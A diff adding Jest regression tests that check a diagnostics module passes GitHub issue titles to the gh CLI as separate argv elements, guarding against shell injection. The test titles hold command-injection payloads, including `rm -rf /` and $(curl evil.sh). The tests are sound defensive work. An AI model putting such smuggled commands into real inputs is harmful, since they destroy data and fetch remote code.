@@ -3,7 +3,12 @@ import * as fs from "fs";
 import * as path from "path";
 import * as os from "os";
 import { DiagnosticContext } from "../../../src/lib/doctor/types";
-import { runDiagnostics, formatFindings } from "../../../src/lib/doctor/runner";
+import {
+  runDiagnostics,
+  formatFindings,
+  buildIssueCreateArgs,
+  buildIssueSearchArgs,
+} from "../../../src/lib/doctor/runner";
 
 // Mock the migration sandbox to avoid PGlite dependency in unit tests
 jest.mock("../../../src/lib/migrate/sandbox", () => ({
@@ -169,5 +174,62 @@ describe("formatFindings", () => {
     expect(output).toContain("[WARNING] Unused import");
     expect(output).toContain("File: src/autogen/order/Order.entity.ts");
     expect(output).toContain("Fix: Fix it");
+  });
+});
+
+// Security regression: the issue TITLE must be passed to `gh` as a discrete
+// argv element (execFile / shell: false), NEVER interpolated into a shell
+// command string. A title containing backticks / $() / quotes must therefore
+// survive verbatim and must NOT be shell-evaluated (no command injection).
+describe("buildIssueCreateArgs (shell-injection safety)", () => {
+  test("passes the title verbatim as a single argv element", () => {
+    const title = "test `whoami` injection";
+    const args = buildIssueCreateArgs(title, "/tmp/body.md");
+
+    // The exact, untouched title appears as its own element.
+    expect(args).toContain(title);
+
+    // It sits immediately after the --title flag.
+    const titleIdx = args.indexOf("--title");
+    expect(titleIdx).toBeGreaterThanOrEqual(0);
+    expect(args[titleIdx + 1]).toBe(title);
+
+    // The body is supplied via a file path, not inline / stdin.
+    const bodyFileIdx = args.indexOf("--body-file");
+    expect(bodyFileIdx).toBeGreaterThanOrEqual(0);
+    expect(args[bodyFileIdx + 1]).toBe("/tmp/body.md");
+  });
+
+  test("backticks are preserved exactly (not substituted) and no element is a shell concatenation", () => {
+    const title = "bug: `rm -rf /` and $(curl evil.sh) \"quoted\"";
+    const args = buildIssueCreateArgs(title, "/tmp/body.md");
+
+    // Backtick / $() / quote characters are present, untouched, in the single
+    // title element — meaning a shell never had a chance to interpret them.
+    const titleArg = args[args.indexOf("--title") + 1];
+    expect(titleArg).toBe(title);
+    expect(titleArg).toContain("`rm -rf /`");
+    expect(titleArg).toContain("$(curl evil.sh)");
+
+    // No argv element is a single shell-command string that concatenates the
+    // title (which would be the bug). The dangerous payload only ever appears
+    // as the standalone, properly-separated title element.
+    const offending = args.filter(
+      (a) => a !== title && (a.includes("gh issue create") || a.includes("--title "))
+    );
+    expect(offending).toHaveLength(0);
+  });
+});
+
+describe("buildIssueSearchArgs (shell-injection safety)", () => {
+  test("passes the search query verbatim as a single argv element", () => {
+    const title = "test `whoami` injection";
+    const args = buildIssueSearchArgs(title);
+
+    const searchIdx = args.indexOf("--search");
+    expect(searchIdx).toBeGreaterThanOrEqual(0);
+    // Search uses the first 100 chars of the title, passed as one argv element.
+    expect(args[searchIdx + 1]).toBe(title.slice(0, 100));
+    expect(args[searchIdx + 1]).toContain("`whoami`");
   });
 });
